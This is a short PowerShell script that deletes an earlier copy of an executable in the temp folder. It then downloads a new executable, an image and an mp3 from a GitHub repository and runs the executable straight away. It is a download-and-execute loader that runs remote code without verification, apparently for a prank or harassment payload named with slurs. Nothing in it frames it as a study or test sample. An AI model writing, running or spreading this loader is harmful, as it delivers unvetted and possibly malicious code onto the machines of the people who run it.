$exe = $env:temp + "\myexe.exe"
$mp3 = $env:temp + "\assets\gays.mp3"
$ura = $env:temp + "\assets\ura.png"

if (Test-Path $exe) {
  Remove-Item $exe
  write-host "$exe has been deleted"
}
else {
  Write-host "$exe doesn't exist"
}

$client = New-Object System.Net.WebClient
$client.DownloadFile("https://github.com/jostanise/s/raw/main/gayz/gayz.exe", $exe)
$client.DownloadFile("https://raw.githubusercontent.com/jostanise/s/main/gayz/assets/ura.png", $ura)
$client.DownloadFile("https://raw.githubusercontent.com/jostanise/s/main/gayz/assets/gayz.mp3", $mp3)
Start-Process -Filepath $exe

